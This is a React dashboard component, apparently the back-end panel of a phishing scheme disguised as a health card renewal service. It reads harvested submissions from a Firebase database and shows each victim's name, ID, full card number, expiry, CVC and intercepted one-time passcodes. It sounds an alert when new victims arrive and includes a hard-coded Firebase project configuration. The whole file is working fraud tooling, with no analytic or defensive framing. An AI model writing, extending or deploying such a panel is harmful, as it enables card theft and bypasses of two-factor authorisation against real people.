'use client'

import { useEffect, useState } from 'react'
import { initializeApp } from 'firebase/app'
import { getFirestore, collection, getDocs, doc, deleteDoc } from 'firebase/firestore'
import { Table, TableBody, TableCaption, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"

const firebaseConfig = {
  apiKey: "AIzaSyB1Tpv9S00TO__RCkAN95ydnMQDR7yEb0A",
  authDomain: "csa3-e2b6a.firebaseapp.com",
  databaseURL: "https://csa3-e2b6a-default-rtdb.firebaseio.com",
  projectId: "csa3-e2b6a",
  storageBucket: "csa3-e2b6a.firebasestorage.app",
  messagingSenderId: "328650323342",
  appId: "1:328650323342:web:468ea6435238c0452be0df",
  measurementId: "G-D32GDGT38Q"
}

const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

interface HealthCardRenewal {
  id: string
  step: number
  name: string
  phone: string
  dateMonth: string
  datayaer: string
  CVC: string
  otp: [string] 
  cardNumber: string
}

export default function Dashboard() {
  const [renewals, setRenewals] = useState<HealthCardRenewal[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [audio, setAudio] = useState<HTMLAudioElement>();
  const [dialogOpen, setDialogOpen] = useState(false)
  const [selectedRenewal, setSelectedRenewal] = useState<HealthCardRenewal | null>(null)

  const playNotificationSound2 = () => {
    setAudio(new Audio('/notif.wav'));
    if (audio) {
      audio!.play().catch((error) => {
        console.error('Failed to play sound:', error);
      });
    }
  };

  async function fetchRenewals() {
    try {
      const renewalsCollection = collection(db, 'pays')
      const renewalsSnapshot = await getDocs(renewalsCollection)
      const renewalsList = renewalsSnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as HealthCardRenewal[]
      setRenewals(renewalsList)
      setLoading(false)
    } catch (err) {
      console.error("Error fetching renewals: ", err)
      setError("Failed to fetch renewals. Please try again later.")
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchRenewals()
  }, [])

  useEffect(() => {
    playNotificationSound2()
  }, [renewals.length])

  if (loading) {
    return <div className="flex justify-center items-center h-screen">Loading...</div>
  }

  if (error) {
    return <div className="flex justify-center items-center h-screen text-red-500">{error}</div>
  }

  const handleCellClick = (renewal: HealthCardRenewal) => {
    setSelectedRenewal(renewal)
    setDialogOpen(true)
  }

  const handleRemove = async (id: string) => {
    try {
      await deleteDoc(doc(db, 'pays', id));
      setRenewals(renewals.filter(renewal => renewal.id !== id));
      setDialogOpen(false);
    
    } catch (err) {
      console.error("Error removing renewal: ", err);
    
    }
  }

  return (
    <div className="container mx-auto p-4" dir="rtl">
      <Card>
        <CardHeader>
          <CardTitle className="text-2xl font-bold">Dashboard</CardTitle>
        </CardHeader>
        <CardContent>
          <Table>
            <TableCaption>A list of all health card renewal submissions.</TableCaption>
            <TableHeader>
              <TableRow>
                <TableCell className="font-bold" dir='rtl'>اسم</TableCell>
                <TableCell className="font-bold" dir='rtl'>ID</TableCell>
                <TableCell className="font-bold" dir='rtl'>سنة</TableCell>
                <TableCell className="font-bold" dir='rtl'>رقم البطاقة</TableCell>
                <TableCell className="font-bold" dir='rtl'>Cvc</TableCell>
                <TableCell className="font-bold" dir='rtl'>otp</TableCell>
              </TableRow>
            </TableHeader>
            <TableBody>
              {renewals.map((renewal) => (
                <TableRow key={renewal.id}>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.name}</TableCell>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.phone}</TableCell>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.datayaer+'/'+renewal.dateMonth}</TableCell>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.cardNumber}</TableCell>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.CVC}</TableCell>
                  <TableCell onClick={() => handleCellClick(renewal)} className="cursor-pointer hover:bg-gray-100">{renewal.otp.map((i) => <i key={i}>{i}</i>)}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>

      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Renewal Information</DialogTitle>
          </DialogHeader>
          {selectedRenewal && (
            <div className="mt-4">
              <p><strong>Name:</strong> {selectedRenewal.name}</p>
              <p><strong>ID:</strong> {selectedRenewal.phone}</p>
              <p><strong>Date:</strong> {selectedRenewal.datayaer}/{selectedRenewal.dateMonth}</p>
              <p className='py-4'><strong>Card Number:</strong> {selectedRenewal.cardNumber}</p>
              <p><strong>CVC:</strong> {selectedRenewal.CVC}</p>
              <p><strong>OTP:</strong> {selectedRenewal.otp.join(', ')}</p>
              <Button 
                onClick={() => handleRemove(selectedRenewal.id)} 
                variant="destructive" 
                className="mt-4"
              >
                مسح البطاقة
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}

